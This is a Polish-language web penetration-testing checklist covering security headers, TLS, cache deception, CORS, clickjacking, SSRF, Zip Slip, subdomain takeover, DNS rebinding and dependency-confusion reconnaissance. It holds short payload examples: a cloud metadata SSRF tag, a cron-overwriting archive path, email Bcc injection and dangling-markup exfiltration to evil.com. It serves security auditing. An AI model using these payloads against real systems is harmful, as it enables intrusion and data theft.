## Nagłówki bezpieczeństwa i konfiguracja transportu

- CAA rekord w DNS — kontrola kto może wystawić certyfikat
    
    Rekord CAA (Certificate Authority Authorization) w DNS określa, które CA mogą wystawiać certyfikaty dla danej domeny. Brak rekordu oznacza, że dowolne CA może wystawić certyfikat — zwiększa ryzyko nieautoryzowanego wydania certyfikatu (np. po social engineeringu wobec CA).
    
    **Co sprawdzić:**
    
    - `dig CAA example.com` — czy rekord istnieje
    - Czy wymienione CA pokrywają się z faktycznie używanymi
    - Czy jest `iodef` tag do raportowania naruszeń
- CORP (Cross-Origin-Resource-Policy)
    
    Nagłówek określa, kto może osadzać zasoby (obrazy, skrypty, style) z danej domeny. Brak nagłówka pozwala na cross-origin embedding — potencjalny wektor do Spectre-type ataków i data leaks przez `<img>`, `<script>` itd.
    
    **Wartości:** `same-origin` | `same-site` | `cross-origin`
    
- COEP (Cross-Origin-Embedder-Policy)
    
    Wymusza, żeby wszystkie zasoby ładowane przez stronę miały jawną zgodę na cross-origin embedding (przez CORS lub CORP). Wymagany do włączenia `SharedArrayBuffer` i `performance.measureUserAgentSpecificMemory()` — bez niego przeglądarka blokuje te API jako ochronę przed Spectre.
    
    **Wartość:** `require-corp`
    
- COOP (Cross-Origin-Opener-Policy)
    
    Izoluje kontekst okna przeglądarki — zapobiega cross-origin window references (`window.opener`). Bez COOP otwarte popupy mogą zachować referencję do okna rodzica i potencjalnie wpływać na nawigację lub odczytywać fragmenty stanu.
    
    **Wartości:** `same-origin` | `same-origin-allow-popups` | `unsafe-none`
    
- Clear-Site-Data — brak przy wylogowaniu
    
    Nagłówek `Clear-Site-Data` przy wylogowaniu pozwala wyczyścić ciasteczka, storage i cache po stronie klienta. Brak oznacza, że po logout dane sesyjne mogą nadal rezydować w cache przeglądarki — session fixation, replay po kradzieży urządzenia.
    
    **Przykład:** `Clear-Site-Data: "cache", "cookies", "storage"`
    
- Brak wsparcia HTTP/2.0
    
    HTTP/1.1 lub niżej — brak multipleksingu, header compression (HPACK), server push. Poza wydajnością: HTTP/1.1 jest podatny na request smuggling przez desynchronizację Content-Length / Transfer-Encoding między frontendem a backendem. HTTP/2 eliminuje wiele klas tych ataków (binary framing).
    
    **Rekomendacja:** HTTP/2 jako minimum, informacyjnie w raporcie.
    
- Brak wsparcia TLS 1.3
    
    TLS 1.2 wciąż akceptowalny, ale TLS 1.3 eliminuje słabe cipher suites (RSA key exchange, CBC), skraca handshake (1-RTT / 0-RTT), usuwa renegotiation attacks. Brak TLS 1.3 to finding informacyjny, ale istotny w kontekście DORA/NIS2.
    
    **Narzędzie:** `testssl.sh --protocols --cipher-per-proto target.com`
    
- Wildcard certificate
    
    Certyfikat `*.example.com` obejmuje wszystkie subdomeny — kompromitacja klucza prywatnego jednego serwisu daje możliwość MITM na każdej subdomenie. Zwiększa blast radius incydentu. Dodatkowo wildcard nie chroni subdomain takeover — atakujący przejmujący subdomenę automatycznie ma ważny cert.
    
- [testssl.sh](http://testssl.sh) — kompleksowy audit TLS
    
    Narzędzie do pełnego audytu konfiguracji TLS: obsługiwane protokoły, cipher suites, kolejność, podatności (BEAST, POODLE, Heartbleed, ROBOT, Ticketbleed), certyfikat chain, HSTS, OCSP stapling.
    
    **Komenda:** `testssl.sh --full target.com:443`
    

---

## Nagłówki cache i proxy

- Pragma: no-cache — ignorowane przez niektóre proxy
    
    `Pragma: no-cache` to nagłówek HTTP/1.0, ignorowany przez wiele nowoczesnych proxy i CDN. Jeśli aplikacja polega wyłącznie na Pragma bez `Cache-Control: no-store`, proxy mogą cache'ować odpowiedzi zawierające wrażliwe dane — serwowanie starej, potencjalnie podatnej wersji zasobu innym użytkownikom.
    
    **Co sprawdzić:** czy odpowiedzi z wrażliwymi danymi mają `Cache-Control: no-store, no-cache` a nie tylko `Pragma`.
    
- Vary header — brak powoduje cache poisoning
    
    Nagłówek `Vary` informuje cache, że odpowiedź zależy od konkretnych nagłówków żądania (np. `Accept-Language`, `User-Agent`, `Origin`). Brak `Vary` oznacza, że cache może serwować odpowiedź wygenerowaną dla jednego kontekstu (np. język, origin CORS) innemu użytkownikowi — cache poisoning, CORS bypass przez cache.
    
    **Przykład ataku:** atakujący wysyła request z `Accept-Language: xx` + payload w nagłówku, odpowiedź trafia do cache i jest serwowana wszystkim.
    
- Wygasłe nagłówki cache
    
    Nagłówki `Expires` ustawione w przeszłości lub niespójne z `Cache-Control` mogą powodować nieoczekiwane zachowanie cache — niektóre proxy interpretują wygasły `Expires` jako "nie cache'uj", inne ignorują go na rzecz `Cache-Control: max-age`. Niespójność = nieprzewidywalne cache'owanie wrażliwych odpowiedzi.
    
- **Cache Deception** — odwrotność cache poisoning. Atakujący nakłania ofiarę do odwiedzenia `https://target.com/account/settings/nonexistent.css`. CDN widzi rozszerzenie `.css` i cache'uje odpowiedź (która jest stroną profilu ofiary z danymi). Atakujący potem odpytuje ten sam URL i dostaje scache'owaną stronę z danymi ofiary. Działa na każdym CDN który cache'uje po rozszerzeniu bez walidacji Content-Type.
- **CRLF Injection w nagłówkach** — jeśli aplikacja wstawia user input do nagłówków HTTP response (np. redirect URL, Set-Cookie), wstrzyknięcie `\r\n` pozwala dodać dowolne nagłówki — XSS via injected `Content-Type`, session fixation via injected `Set-Cookie`, cache poisoning via injected `X-Forwarded-Host`. Testowalny na każdym endpoincie z redirect lub dynamicznym nagłówkiem.

---

## Sesja, autoryzacja i tokeny

- Brak Rate Limiting
    
    Brak ograniczeń liczby requestów na endpoint — umożliwia brute-force credentials, OTP, tokenów reset-password, enumerację użytkowników, resource exhaustion (DoS). Krytyczne na endpointach: login, reset password, OTP verification, API keys, rejestracja.
    
    **Co sprawdzić:** wielokrotne requesty z błędnymi danymi — czy pojawia się 429, CAPTCHA, lockout, opóźnienie.
    
- MFA — brak lub słaba implementacja
    
    Brak MFA na krytycznych operacjach (login, zmiana hasła, zmiana email, transakcje). Ale też: MFA bypass — czy token MFA jest powiązany z sesją, czy można go replay'ować, czy brak rate limit na kodach OTP (brute-force 6-cyfrowego kodu = 1M kombinacji), czy backup codes są odpowiednio chronione.
    
- Słaba entropia tokenów reset-password / magic link
    
    Tokeny zbyt krótkie (np. 6-znakowy hex = 16M kombinacji — brute-forceable), przewidywalne (sekwencyjne, timestamp-based), lub bez odpowiedniego TTL. Dwa skrajne błędy:
    
    - **Brak TTL** — token ważny bezterminowo, wystarczy wyciek z logów/email
    - **Zbyt krótki TTL** — użytkownik nie zdąży użyć, frustracja → obejścia bezpieczeństwa
    
    **Rekomendacja:** minimum 128-bit entropia, TTL 15–60 min, single-use, invalidacja przy nowym żądaniu.
    
- Przewidywalne identyfikatory
    
    Sekwencyjne ID zasobów (np. `/user/1001`, `/invoice/5432`) umożliwiają enumerację i IDOR. Dotyczy: użytkowników, dokumentów, zamówień, faktur, sesji. Nawet jeśli autoryzacja działa poprawnie — sekwencyjne ID ujawniają liczbę rekordów, tempo wzrostu (business intelligence leak).
    
    **Rekomendacja:** UUID v4 lub CUID jako identyfikatory publiczne.
    

---

## CORS i Origin

- Access-Control-Allow-Origin: null
    
    Odpowiedź CORS z `Access-Control-Allow-Origin: null` jest niebezpieczna — origin `null` jest wysyłany przez sandboxowane iFrame, `data:` URI, lokalne pliki. Atakujący może utworzyć stronę z `<iframe sandbox="allow-scripts">` która wysyła requesty z origin `null` — jeśli serwer akceptuje `null`, przeglądarka pozwala na odczyt odpowiedzi cross-origin.
    
    **Dodatkowy kontekst:** w kombinacji z `Access-Control-Allow-Credentials: true` — pełny dostęp do autentykowanych danych ofiary.
    

---

## Iframe i Clickjacking

- Iframe sandbox escape przez allow-popups + allow-scripts
    
    `<iframe sandbox="allow-scripts">` bez `allow-top-navigation` wygląda bezpiecznie. Ale kombinacja `allow-popups` + `allow-scripts` pozwala na otwarcie popupu przez `window.open()` — popup **nie dziedziczy restrykcji sandbox**. Nowe okno ma pełne uprawnienia origin, co pozwala na nawigację, dostęp do cookies, wykonanie akcji w kontekście zalogowanego użytkownika.
    
    **Co sprawdzić:** atrybuty sandbox na wszystkich iframe — szukać kombinacji `allow-scripts allow-popups` bez `allow-popups-to-escape-sandbox` (który jest tu intended) vs przypadkowy escape.
    
- Clickjacking przez drag-and-drop
    
    Klasyczny clickjacking jest blokowany przez `X-Frame-Options` i CSP `frame-ancestors`. Ale drag-and-drop API może ominąć te zabezpieczenia w specyficznych scenariuszach.
    
    **Mechanizm:**
    Strona atakującego osadza niewidoczny iframe z `target.com`. Widoczna warstwa zawiera element zachęcający do drag-and-drop (np. "przeciągnij plik tutaj"). Ofiara inicjuje drag na elemencie z iframe (pole z CSRF tokenem, wartość formularza). Przy drop `dataTransfer.getData("text")` może zawierać dane z cross-origin iframe.
    
    **Ograniczenia:** nowsze przeglądarki ograniczają `dataTransfer` przy cross-origin drag. Działa głównie na starszych przeglądarkach lub w specyficznych wersjach. Praktyczniejszy wariant: nie eksfiltracja danych, ale wymuszenie akcji (przeciągnięcie przycisku "potwierdź").
    
    **Warunki:** target nie ma `X-Frame-Options`, użytkownik zalogowany, starsze przeglądarki.
    
- **SSRF via PDF/HTML rendering** — aplikacja generuje PDF z HTML (wkhtmltopdf, Puppeteer, WeasyPrint). HTML zawiera `<img src="http://169.254.169.254/latest/meta-data/">` lub `<iframe>`, `<link>` — renderer wykonuje request server-side. Dostęp do metadata endpoint AWS/GCP/Azure, wewnętrznych serwisów, local files via `file://`. Dotyczy każdej aplikacji z generowaniem PDF z user-controlled contentu.

---

## Upload, pliki i archiwa

- Brak antywirusa / sandboxingu uploadów
    
    Upload plików bez skanowania AV i bez sandboxingu — pozwala na przesłanie malware, web shelli, polyglotów (plik który jest jednocześnie JPG i PHP/HTML). Nawet jeśli rozszerzenie jest walidowane — MIME type mismatch, double extensions (`.jpg.php`), null byte injection w starszych systemach.
    
    **Co sprawdzić:** czy upload przechodzi przez AV, czy pliki są serwowane z innej domeny (izolacja origin), czy Content-Disposition: attachment, czy przechowywane z losową nazwą.
    
- Metadane plików
    
    Uploadowane pliki mogą zawierać wrażliwe metadane: EXIF w obrazach (GPS, model urządzenia, dane użytkownika), metadane w PDF (autor, oprogramowanie, historia edycji), metadata w DOCX/XLSX (autro, komentarze, ślady zmian). Serwowanie plików bez strippowania metadanych = wyciek danych.
    
    Odwrotnie — uploadowane pliki z crafted metadanymi mogą być wektorem ataków (XSS w EXIF, XXE w SVG/DOCX).
    
- MIME type — Accept: */* w requeście
    
    Klient wysyłający `Accept: */*` akceptuje dowolny Content-Type odpowiedzi. Jeśli serwer nie wymusza odpowiedniego `Content-Type` i `X-Content-Type-Options: nosniff` — przeglądarka może dokonać MIME sniffing i zinterpretować odpowiedź jako HTML/JS, otwierając wektor XSS. Szczególnie istotne przy endpointach zwracających user-controlled content.
    
- Zip Slip — path traversal przy ekstrakcji archiwów
    
    Atak na biblioteki rozpakowujące archiwa ZIP/TAR, które nie sanityzują ścieżek plików. Archiwum zawiera wpisy z `../` w nazwie — plik ląduje poza docelowym katalogiem.
    
    **Przykład ścieżki:** `../../../../etc/cron.d/evil` — przy ekstrakcji z prawami root nadpisuje cron job.
    
    **Dotyczy:** każdego języka i frameworka który obsługuje upload + ekstrakcję archiwów. Historycznie podatne biblioteki w Java, Python, Ruby, Go, JS.
    
    **Co sprawdzić:** czy aplikacja akceptuje upload archiwów, czy po stronie serwera następuje ekstrakcja, jakie uprawnienia ma proces.
    

---

## DNS i subdomain

- Subdomain takeover — CNAME do nieistniejącego zasobu
    
    Rekord CNAME wskazujący na zewnętrzny serwis (S3 bucket, GitHub Pages, Heroku, Azure) który został usunięty. Atakujący rejestruje ten sam zasób i przejmuje subdomenę — może serwować content pod trusted domeną ofiary, kradzież cookies (jeśli ustawione na `.example.com`), phishing, credential harvesting.
    
    **Co sprawdzić:** `dig CNAME sub.example.com` → czy target istnieje, czy zwraca NXDOMAIN lub charakterystyczne błędy serwisu (NoSuchBucket, There isn't a GitHub Pages site here).
    
- DNS rebinding
    
    Atak na serwisy nasłuchujące na [localhost](http://localhost) lub sieci prywatnej (192.168.x.x) bez weryfikacji Host header.
    
    **Mechanizm:**
    
    1. Atakujący rejestruje domenę z TTL=0
    2. DNS najpierw zwraca IP atakującego — przeglądarka ładuje stronę ze złośliwym JS
    3. DNS rebinduje na `127.0.0.1`
    4. Przeglądarka traktuje to jako same-origin (ta sama domena) — JS może wysyłać żądania do [localhost](http://localhost)
    
    **Cele:** router admin panels, development servery, IoT devices, Docker API, wewnętrzne mikroserwisy.
    
    **Ochrona:** walidacja Host header, nie poleganie wyłącznie na IP-based access control.
    

---

## Client-side i przeglądarka

- Subresource Integrity (SRI) — brak
    
    Zewnętrzne skrypty i style ładowane bez atrybutu `integrity` — jeśli CDN zostanie skompromitowane lub dostawca zmieni plik, przeglądarka załaduje zmodyfikowany zasób bez weryfikacji. Supply chain attack na frontend.
    
    **Przykład:**
    
    html
    
    `<script src="https://cdn.example.com/lib.js" 
            integrity="sha384-..." 
            crossorigin="anonymous"></script>`
    
    **Co sprawdzić:** `<script>` i `<link>` ładujące z zewnętrznych domen — czy mają `integrity` hash.
    
- Dependency confusion / typosquatting
    
    Prywatne pakiety z nazwami które mogą kolidować z publicznym registry (npm, PyPI). Atakujący publikuje pakiet o tej samej nazwie w publicznym registry z wyższą wersją — build system pobiera publiczną wersję zamiast prywatnej. Typosquatting: pakiet o podobnej nazwie do popularnego (`lodash` → `1odash`).
    
    **Co sprawdzić:** czy `.npmrc` / `pip.conf` wymusza prywatny registry dla prywatnych scope'ów, czy lockfile jest commitowany, czy CI/CD robi integrity check.
    
    - Rozszerzenie
        
        # 🔎 1. Wyciek nazw paczek (najważniejsze)
        
        Twoim celem jest zdobycie **nazw zależności** – to paliwo do dalszego ataku.
        
        ### Szukaj w:
        
        - **stack trace / błędy backendu**
        - **frontend JS (bundle, sourcemapy)**
        - **console errors**
        - **HTTP headers (rzadziej)**
        - **publiczne repo powiązane z firmą**
        
        ### Przykłady:
        
        ```
        Error:Cannot find module'@company/auth-core'
        ```
        
        ```
        import {api }from"@internal/api-client"
        ```
        
        ```
        ModuleNotFoundError:Nomodulenamed'acme_utils'
        ```
        
        👉 To jest złoto — masz potencjalną nazwę prywatnego pakietu.
        
        ---
        
        # 🧠 2. Fingerprinting stacku (pośredni sygnał)
        
        Najpierw ustal:
        
        - Node.js / Python / Java?
        - framework (Next.js, Django, Flask, Spring)
        
        Dlaczego?
        
        → wiesz wtedy **gdzie szukać dependency leakage**
        
        ### Narzędzia:
        
        - whatweb
        - wappalyzer
        - ręczna analiza nagłówków + JS
        
        ---
        
        # 🧩 3. Analiza frontendu (bardzo skuteczna)
        
        ### Co robisz:
        
        - pobierasz JS bundle
        - szukasz stringów
        
        ```
        grep-i"@company" app.js
        grep-i"internal" app.js
        grep-i"client" app.js
        ```
        
        ### Szukaj:
        
        - `@org/package`
        - `internal-*`
        - `-client`
        - `-sdk`
        
        👉 Wiele firm nie czyści bundli → wycieki nazw są częste
        
        ---
        
        # 🗺️ 4. Sourcemapy (jeśli są dostępne)
        
        Jeśli znajdziesz `.map`:
        
        ```
        curl https://target/app.js.map
        ```
        
        To masz:
        
        - pełne ścieżki plików
        - często nazwy paczek
        - czasem nawet strukturę repo
        
        ---
        
        # 🌐 5. DNS / subdomeny → registry
        
        Często firmy mają własne registry:
        
        Szukaj:
        
        ```
        npm.company.com
        pypi.company.com
        packages.company.com
        artifactory.company.com
        nexus.company.com
        ```
        
        ### Techniki:
        
        - `crt.sh`
        - `amass`
        - `subfinder`
        
        👉 Jeśli istnieje prywatne registry → **duża szansa na prywatne paczki**
        
        ---
        
        # 🔐 6. Endpointy API / debug / healthcheck
        
        Czasem:
        
        ```
        /health
        /debug
        /version
        /metrics
        ```
        
        zwracają:
        
        ```
        {
          "dependencies": {
            "@company/auth":"2.1.0"
          }
        }
        ```
        
        ---
        
        # 📦 7. Passive OSINT (niedoceniane)
        
        Sprawdź:
        
        - GitHub organizacji
        - stare repo
        - npm (czy ktoś nie opublikował przez przypadek)
        - PyPI
        
        Czasem ktoś:
        
        - opublikował prywatny pakiet publicznie
        - zostawił nazwę w README
        
        ---
        
        # 💣 8. Próba dependency confusion (kontrolowana)
        
        Jeśli masz nazwę typu:
        
        ```
        @company/utils
        acme-internal-api
        ```
        
        Możesz:
        
        - sprawdzić czy istnieje w npm/PyPI
        - jeśli nie → potencjalny target
        
        👉 ALE:
        
        - rób to tylko jeśli masz zgodę (to już zahacza o aktywny atak)
        - to nie jest pasywny test
        
        ---
        
        # 🚨 9. Heurystyki (czy to prywatne?)
        
        Podejrzane nazwy:
        
        - `@company/*`
        - `internal-*`
        - `core-*`
        - `shared-*`
        - `common-*`
        - `sdk-*`
        
        To nie dowód, ale:
        
        👉 im bardziej “organizacyjne”, tym większa szansa że prywatne
        
        ---
        
        # ❗ Reality check (ważne)
        
        Bez:
        
        - kodu
        - CI/CD
        - konfiguracji registry
        
        👉 **nie potwierdzisz na 100% dependency confusion risk**
        
        Możesz tylko:
        
        - znaleźć potencjalne nazwy
        - wskazać ryzyko
        - opisać scenariusz ataku
- Autocomplete na polach haseł / kart bez autocomplete="off"
    
    Pola formularzy zawierające hasła, numery kart, CVV bez `autocomplete="off"` lub `autocomplete="new-password"` — przeglądarka może zapisać te dane w local storage/credential manager. Na publicznym / współdzielonym komputerze = wyciek credentials do następnego użytkownika.
    
    **Uwaga:** nowoczesne przeglądarki mogą ignorować `autocomplete="off"` na polach haseł (UX decision). Raportować jako finding informacyjny z kontekstem.
    
- Base URI injection przy względnych URL zasobów
    
    Jeśli strona używa względnych URL do ładowania zasobów (`<script src="app.js">`) i atakujący może wstrzyknąć `<base href="https://evil.com/">` — wszystkie względne URL zostaną rozwiązane względem domeny atakującego. Ładowanie skryptów, stylów, obrazów z serwera atakującego.
    
    **Ochrona:** CSP `base-uri 'self'` lub `base-uri 'none'`.
    
- UTF-7 encoding bypass (XSS historyczny)
    
    UTF-7 pozwala enkodować znaki ASCII jako sekwencje typu `+ADw-` itd. Jeśli serwer nie ustawia explicit charset w `Content-Type` i przeglądarka dokonuje auto-detection UTF-7:
    
    `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` → `<script>alert(1)</script>` w UTF-7.
    
    **Status:** nowoczesne przeglądarki nie dokonują auto-detection UTF-7. Finding historyczny, ale wart sprawdzenia w:
    
    - Starszych aplikacjach / IE compatibility mode
    - Email rendererach (Outlook, webmail)
    - PDF rendererach
- Informacje o ciasteczkach — konfiguracja
    
    Przegląd flag na ciasteczkach sesyjnych i wrażliwych:
    
    - `Secure` — tylko HTTPS
    - `HttpOnly` — niedostępne z JS (ochrona przed XSS exfiltracja)
    - `SameSite=Strict|Lax` — ochrona przed CSRF
    - `Path` i `Domain` — zbyt szerokie ustawienia = dostęp z niechcianych subdomen/ścieżek
    - `__Host-` prefix — wymusza Secure, brak Domain, Path=/
    - `__Secure-` prefix — wymusza Secure
- Wykorzystanie rozwiązań chmurowych (identyfikacja przez DevTools)
    
    Zakładka Source w DevTools + nagłówki odpowiedzi ujawniają infrastrukturę: CDN (CloudFront, Akamai, Cloudflare), storage (S3 bucket names), compute (Lambda, Cloud Functions), API Gateway. Informacje przydatne do:
    
    - Identyfikacji surface area (S3 misconfig, Lambda abuse)
    - Targetowania ataków specyficznych dla provider'a
    - Rekonesansu infrastruktury
    
    **Co sprawdzić:** nagłówki `x-amz-*`, `x-goog-*`, `cf-ray`, URL zasobów w Source tab, error messages.
    
- **Email Header Injection** — formularz kontaktowy/rejestracyjny wstawia user input do pól email (From, To, CC, Subject). Wstrzyknięcie `\r\nBcc: attacker@evil.com` lub `\r\nContent-Type: text/html` — spamowanie, phishing z trusted domeny, zmiana treści maila. Stary atak, wciąż żywy w custom formach.

Inne

- **Parameter Pollution (HPP)** — ten sam parametr wysłany wielokrotnie: `?user=admin&user=victim`. Backend i frontend mogą interpretować różnie — Express bierze pierwszy, PHP/Apache ostatni, Java tworzy tablicę. Jeśli WAF sprawdza wartość inaczej niż backend — bypass filtrów. Uniwersalne, trudne do wykrycia skanerami.
- **WebSocket security gaps** — brak autoryzacji per-message (tylko przy handshake), brak rate limiting, brak walidacji origin (CSWSH — Cross-Site WebSocket Hijacking), tokeny sesyjne w URL (ws://target.com/ws?token=xxx — leakuje w logach i Referer). Rzadko testowane, a coraz powszechniejsze.
- **Timing attacks na porównywanie stringów** — porównanie tokenów, API keys, haseł przez zwykły `==` zamiast constant-time compare. Różnica w czasie odpowiedzi ujawnia ile znaków jest poprawnych. Wymaga wielu pomiarów, ale jest uniwersalne i dotyczy każdego custom auth.
- **Dangling Markup Injection** — nie można domknąć tagu do pełnego XSS, ale można wstrzyknąć niezamknięty tag, np. `<img src="https://evil.com/?leak=` — przeglądarka szuka zamykającego `"` i "wchłania" dalszy fragment HTML strony (w tym tokeny CSRF, dane formularza) jako część atrybutu src. Request do evil.com zawiera wyciekłe dane w URL. Działa gdy CSP blokuje inline scripts ale pozwala na external images
